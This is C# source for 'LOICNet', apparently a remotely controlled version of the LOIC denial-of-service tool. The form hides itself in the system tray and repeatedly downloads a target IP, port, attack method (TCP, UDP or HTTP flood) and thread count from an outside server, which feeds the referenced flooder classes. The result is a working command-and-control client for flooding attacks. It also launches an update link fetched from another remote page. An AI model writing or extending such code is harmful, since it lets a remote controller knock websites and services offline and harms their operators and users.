using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace LOICNet
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        public static XXPFlooder[] xxP;
        public static HTTPFlooder[] HTTP;
        string sIP, sMethod, sData, sSubsite;
        int iPort, iThreads, iProtocol, iDelay, iTimeout;
        bool bResp, bActive;

        public static string PrgDomain = "http://tox.awardspace.us/LOICNet/";
        public static string ToxDomain = "http://www.praetox.com/";

        private void frmMain_Load(object sender, EventArgs e)
        {
            MenuItem[] nico_menu = new MenuItem[3];
            nico_menu[0] = new MenuItem("Show config", nico_menu_config_show);
            nico_menu[1] = new MenuItem("About", nico_menu_about);
            nico_menu[2] = new MenuItem("Exit", nico_menu_exit);
            nico.ContextMenu = new ContextMenu(nico_menu);
            nico.Icon = this.Icon;
            nico.Text = "Double click to show / hide LOICNet.\nRight click for a menu.";
            nico.Visible = true;

            this.Text += Application.ProductVersion;
            try
            {
                string lol = new System.Net.WebClient().DownloadString(
                    PrgDomain + "LOICNet_version.php?cv=" + Application.ProductVersion);
                if (!lol.Contains("<VERSION>" + Application.ProductVersion + "</VERSION>"))
                {
                    bool GetUpdate = (DialogResult.Yes == MessageBox.Show(
                        "A new version is available. Update?",
                        "so i herd u liek mudkipz", MessageBoxButtons.YesNo));
                    if (GetUpdate)
                    {
                        string UpdateLink = new System.Net.WebClient().DownloadString(
                            ToxDomain + "inf/LOICNet_link.html").Split('%')[1];
                        System.Diagnostics.Process.Start(UpdateLink + "?cv=" + Application.ProductVersion);
                        Application.Exit();
                    }
                }
            }
            catch
            {
                MessageBox.Show("Couldn't check for updates.\r\n\r\nAlso, cocks.", "A cat is fine too");
            }

            tHide.Start(); tGetConfig.Start();
        }

        void tHide_Tick(object sender, EventArgs e)
        {
            tHide.Stop();
            lbCustomSpd.Text = "<-faster   Speed   slower->";
            tbDelay.Visible = true;
            this.Hide();
        }
        private void nico_menu_config_show(object sender, EventArgs e)
        {
            MessageBox.Show(
                "The following configuration was loaded from server:" + "\r\n" +
                "\r\n" +
                "Active? " + bActive + "\r\n" +
                "Get config every " + (tGetConfig.Interval/1000) + " seconds" + "\r\n" +
                "\r\n" +
                "Target IP: " + sIP + "\r\n" +
                "Target port: " + iPort + "\r\n" +
                "Attack method " + iProtocol + " (" + sMethod + ")" + "\r\n" +
                "Attacking with " + iThreads + " emulated connections" + "\r\n" +
                "Waiting for reply? " + bResp + "\r\n" +
                "Slowdown delay: " + iDelay + "\r\n" +
                "\r\n" +
                "XXP message: " + sData + "\r\n" +
                "Subsite: " + sSubsite + "\r\n" +
                "Timeout: " + iTimeout);
        }
        private void nico_menu_about(object sender, EventArgs e)
        {
            MessageBox.Show("About.");
        }
        private void nico_menu_exit(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private void nico_DoubleClick(object sender, EventArgs e)
        {
            if (this.Visible)
            {
                this.Hide();
                this.ShowInTaskbar = false;
            }
            else
            {
                this.Show();
                this.ShowInTaskbar = true;
            }
        }

        private void tGetConfig_Tick(object sender, EventArgs e)
        {
            tGetConfig.Stop();
            string cfg = new System.Net.WebClient().DownloadString(
                PrgDomain + "LOICNet_Config.html");

            int iActive = Convert.ToInt32(SplitXML(cfg, "Active"));
            bActive = (iActive == 1);
            int iRFreq = Convert.ToInt32(SplitXML(cfg, "RFreq"));
            sIP = SplitXML(cfg, "IP");
            iPort = Convert.ToInt32(SplitXML(cfg, "Port"));
            sMethod = SplitXML(cfg, "Method");
            if (sMethod == "TCP") iProtocol = 1;
            if (sMethod == "UDP") iProtocol = 2;
            if (sMethod == "HTTP") iProtocol = 3;
            iThreads = Convert.ToInt32(SplitXML(cfg, "Threads"));
            int iResp = Convert.ToInt32(SplitXML(cfg, "Block"));
            bResp = (iResp == 1);
            sData = SplitXML(cfg, "XXPMsg");
            sSubsite = SplitXML(cfg, "Subsite");
            iTimeout = Convert.ToInt32(SplitXML(cfg, "Timeout"));

            lbRFreq.Text = "" + iRFreq;
            lbIP.Text = "" + sIP;
            lbPort.Text = "" + iPort;
            lbMethod.Text = "" + iProtocol + " (" + sMethod + ")";
            lbThreads.Text = "" + iThreads;
            lbResp.Text = "" + bResp;
            lbDelay.Text = "" + iDelay;
            lbXXPMsg.Text = "" + sData;
            lbSubsite.Text = "" + sSubsite;
            lbTimeout.Text = "" + iTimeout;

            tGetConfig.Interval = iRFreq * 1000;
            tGetConfig.Start();
        }
        private string SplitXML(string src, string delim)
        {
            src = src.Substring(src.IndexOf("<" + delim + ">") + delim.Length + 2);
            src = src.Substring(0, src.IndexOf("</" + delim + ">"));
            return src;
        }

        private void tbDelay_ValueChanged(object sender, EventArgs e)
        {
            iDelay = tbDelay.Value;
        }
    }
}
